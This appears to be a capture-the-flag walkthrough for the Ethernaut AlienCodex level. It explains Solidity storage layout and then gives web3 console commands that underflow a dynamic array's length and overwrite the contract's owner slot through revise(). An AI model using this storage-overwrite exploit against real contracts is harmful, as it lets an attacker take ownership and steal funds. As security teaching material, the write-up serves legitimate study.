// To solve this level, we need to understand some things about:
// - how storage variables are laid out in Solidity contracts (further
//   information of what we already know)
// - how dynamic arrays work in Solidity

/* 
The first thing to understand is how inherited state variables are laid out

When code is imported into a contract, upon deployment, the content of the
 imported .sol file is basically just pasted into the version of your code
 that end up being deployed

This means that the state variables you create in your contract will
 actually end up in a different place than you would expect if you were just
 looking at the contract code alone

For example, since there is an import statement for the Ownable-05.sol file,
 the content of this file is pasted above the code for the AlienCodex
 contract -- then, if we look in Ownable-05.sol, we see that there is one
 state variable, owner

Because of the way storage is laid out, owner takes slot 0 in the storage
 array, and then the actual AlienCodex variables are stored after that

Then, one would expect that the contact state variable in AlienCodex would
 occupy space 2, but since owner and contact each do not take up the full
 32 bytes of a slot, they are packed together in the one slot
*/

// this means that
await web3.eth.getStorageAt(instance, 0);
// >> returns 0x**********************[contact boolean as 1 hex digit][owner address for 20 bytes]

// And we see how the two state variables are packed into one storage slot

/*
Referring to the Solidity docs for how dynamic arrays are laid out in Solidity:
 https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#mappings-and-dynamic-arrays

For dynamic arrays, the only data stored in the storage slot that you would
 think the array starts just stores the length of the array

I.e. in AlienCodex, when the codex array has 3 elements, the storage slot with
 index 1 stores 0x...03 (32 bytes)

Then, the actual storage for the elements of the array starts at keccak256(p),
 where p is the storage slot "you would expect", i.e. 1 for the AlienCodex

Then, index 0 of the array is at memory location keccak256(p), index 1 is at
 memory location keccak256(p) + 1 etc.
*/

// You may notice that it's interesting how elements are removed from the
//  dynamic array (a "feature" of Solidity 0.5.0) -- instead of removing the
//  elements, the length of the dynamic array is just decremented

// However, there is nothing to stop us from underflowing the length number

// Once we underflow the length number, the array is virtually the entire
//  storage space of the contract, so using any methods that edits the array
//  will allow us to change any storage slot that we want

// This is what we will do to solve the level

// first, make contact so we can use the methods
await contract.make_contact();

await contract.contact();
// >> returns true

// then, underflow the array length
await contract.retract();

await web3.eth.getStorageAt(instance, 1);
// >> retunrs 0xff...ffff (32 bytes of f)

// after that, we need to find the array index where the owner state variable
//  is, and then use the revise() method to update it

// https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow

// we know that owner occupies storage slot 0, or in terms of overflow, this is
//  equivalent to 2**256

// hence, the owner state variable is located at an index of
//  2**256 - keccak(0x00..01) = 0x4EF1D2AD89EDF8C4D91132028E8195CDF30BB4B5053D4F8CD260341D4805F30A
//                   ^^ 32 byte value

// so we run
await contract.revise(
    "0x4EF1D2AD89EDF8C4D91132028E8195CDF30BB4B5053D4F8CD260341D4805F30A",
    my_address_paddded_to_32_bytes
);

await web3.eth.getStorageAt(instance, 0);
// >> returns my address in the lower 20 bytes

await contract.owner();
// >> returns my address

// submit
